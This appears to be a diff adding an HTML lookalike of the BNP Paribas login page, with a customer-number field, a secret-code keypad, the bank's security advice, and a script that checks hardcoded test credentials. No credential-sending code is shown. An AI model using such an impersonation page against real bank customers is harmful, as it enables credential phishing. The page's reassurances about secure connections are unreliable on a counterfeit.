@@ -1,0 +1,298 @@
+
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Connexion - Mon compte BNP la banque d'un monde qui change</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<meta charset="utf-8"/>
+
+
+<script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+		<link rel="preconnect" href="https://fonts.googleapis.com"> 
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
+<link href="https://fonts.googleapis.com/css2?family=Dosis:wght@500&display=swap" rel="stylesheet">
+		<link href="https://www.fonts.com/font/yellow-design-studio/veneer-clean" />
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+   		 <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+	  
+<link rel="stylesheet" type="text/css" href="Style.css"/>
+
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+<script type="text/javascript" src="Java.js"></script>
+
+
+<style>
+	#text{
+		color:rgb(230, 13, 13);
+		padding: 10px;
+		width: 100%;
+        margin:0px;
+        line-height:inherited;
+        font-size:20px;
+	}
+   /* Style général */
+body {
+    font-family: 'Dosis', sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f5f5f5;
+}
+
+.navbar {
+    background-color: white;
+    padding: 10px;
+    text-align: center;
+    border-bottom: 1px solid #e0e0e0;
+}
+
+.navbar img {
+    max-height: 50px;
+}
+
+/* Section principale avec fond vert */
+.slog {
+    background-color: #00a650; /* Couleur du fond vert */
+    padding: 30px;
+    text-align: center;
+    border-bottom-left-radius: 20px;
+    border-bottom-right-radius: 20px;
+    color: white;
+}
+
+.slog h1 {
+    font-size: 32px;
+    margin: 0 0 20px;
+    font-weight: bold;
+}
+
+/* Formulaire de connexion */
+.log {
+    max-width: 400px;
+    margin: 0 auto;
+    padding-bottom: 20px; /* Ajuster pour aligner le bouton */
+    text-align: left;
+}
+
+.log label {
+    display: block;
+    margin-bottom: 15px;
+    font-size: 16px;
+}
+
+.number, .pass {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    margin-top: 5px;
+    font-size: 16px;
+}
+
+.tab {
+    margin-top: 20px;
+}
+
+.car {
+    width: 100%;
+    table-layout: fixed;
+    border-collapse: collapse;
+    margin-top: 10px;
+}
+
+.car td {
+    text-align: center;
+    padding: 5px;
+}
+
+.y {
+    width: 60px;
+    height: 60px;
+    font-size: 18px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    background-color: white;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.y:hover {
+    background-color: #f0f0f0;
+}
+
+.b {
+    display: block;
+    width: 100%;
+    padding: 15px;
+    background-color: #007b3d;
+    color: white;
+    font-size: 18px;
+    font-weight: bold;
+    border: none;
+    border-radius: 5px;
+    margin-top: 20px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.b:hover {
+    background-color: #005a2b;
+}
+
+/* Informations et conseils */
+.info {
+    padding: 20px;
+    background-color: white;
+    text-align: left;
+    font-size: 14px;
+    color: #333;
+}
+
+.info a {
+    color: #007b3d;
+    text-decoration: none;
+    font-weight: bold;
+}
+
+.info a:hover {
+    text-decoration: underline;
+}
+
+.suite hr {
+    margin: 20px 0;
+    border: none;
+    height: 1px;
+    background-color: #c0c0c0;
+}
+
+footer{
+
+    background-color: #c0c0c0;
+}
+
+
+
+
+</style>
+
+	</head>
+	<body>
+	<div class="navbar">
+	<img src="WhatsApp Image 2025-01-25 at 22.59.22.jpeg"></a><H3>BNP PARIBAS</H3>
+	</div>
+	
+	<form>
+	<div class="slog">
+	<h1>ACCEDER À MON<br/>COMPTE</h1>
+<div id="text">
+</div>
+	<div class="log">
+	<label><strong>1. Mon numero client</strong><br/>
+	<input type="tel" class="number" id="i" maxlength="10"></label><br/>
+	<label><strong>2. Mon code secret (6 chiffres)</strong><br/>
+	<input type="password" readonly="true" pattern="[0-9]*" inputmode="numeric" maxlength="6" class="pass" id="o" onclick="dlt()"></label>
+	
+	<div class="tab">
+        <div class="tab">
+            <table class="car">
+              <tr>
+                <td><button type="button" class="y" onclick="addNumber(0)">0</button></td>
+                <td><button type="button" class="y" onclick="addNumber(1)">1</button></td>
+                <td><button type="button" class="y" onclick="addNumber(2)">2</button></td>
+                <td><button type="button" class="y" onclick="addNumber(3)">3</button></td>
+                <td><button type="button" class="y" onclick="addNumber(4)">4</button></td>
+              </tr>
+              <tr>
+                <td><button type="button" class="y" onclick="addNumber(5)">5</button></td>
+                <td><button type="button" class="y" onclick="addNumber(6)">6</button></td>
+                <td><button type="button" class="y" onclick="addNumber(7)">7</button></td>
+                <td><button type="button" class="y" onclick="addNumber(8)">8</button></td>
+                <td><button type="button" class="y" onclick="addNumber(9)">9</button></td>
+              </tr>
+            </table>
+          </div>
+         
+                    
+	
+	
+	
+	
+	<button type="button" onclick="valid()" class="b"><strong>Acceder a mes Comptes</strong></button>
+	</div>
+	</div>
+	</form>
+	<footer>
+	<div class="info">
+	<p><strong>vos codes d'acces</strong></p>
+	<a href="">obtenir ses code d'acces<br/></a>
+<a href="">code secret oublier</a><br/><br/>
+<div class="suite">
+    <hr style="color:#C0C0C0">
+        <p><strong>conseils de securite</strong></p>
+        <p>verifier que l'adresse du site commennce bien par:</p>
+    <br />
+    <p>https://connexion-mabanque.bnpparibas</p>
+    <br />
+    <p>preceder par une icone cadenas et contient un <strong>https://</strong>qui garantiront une connexion securiser</p>
+    <a href="#">decouvrez nos conseil securite</a><p>et les bonne pratiques pour consulter et<br/>identifier les dangers du web.</p>
+    <hr style="color:#C0C0C0">
+    <p</strong>pour une meilleure accessibilité</strong></p><br/>
+    <a href="#">connectez-vous</a><p>grace a la grille contrastée agrandi et beneficiez d'un accompagnement vocale</p><br/>
+    <a href="#">utilisez facil'iti</a><p>pour personnaliser l'affichage en fonction de votre situation (handicap visuel et cognitif).</p><br/>
+    <hr style="color:#C0C0C0">
+    <p><strong>Information client</strong></p>
+    <p>Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter nos conseillers en ligne au :<br/>
+    
+    ou à nous signaler un problème technique.
+    Vous pouvez également gérer vos comptes depuis votre mobile ou votre tablette via l'application Mes comptes.</p>
+        </div>
+        
+        
+    
+	
+	
+	
+	
+<!--	<footer>
+<center><p style="color:white;font-weight:500;">suivez-nous sur:</p></center>-->
+<div class="follow">
+
+</div>
+
+
+		
+        <script>
+  // Fonction pour ajouter un chiffre au champ de mot de passe
+  function addNumber(num) {
+      var input = document.getElementById("o"); // Champ mot de passe
+      if (input.value.length < 6) { // Limiter à 6 chiffres
+          input.value += num;
+      }
+  }
+
+  // Fonction pour valider les entrées
+  function valid() {
+      var numeroClient = document.querySelector(".number").value;
+      var codeSecret = document.querySelector(".pass").value;
+
+      if (numeroClient !== "" && codeSecret !== "") {
+          if (numeroClient === "123456789" && codeSecret === "101010") {
+              window.location = "connexion.html"; // Redirection si les infos sont correctes
+          } else {
+              alert("Accès incorrect. Veuillez vérifier vos identifiants et réessayer.");
+          }
+      } else {
+          alert("Veuillez remplir tous les champs.");
+      }
+  }
+</script>
+
+
+
+	
+	</footer>
+	</body>
+</html>
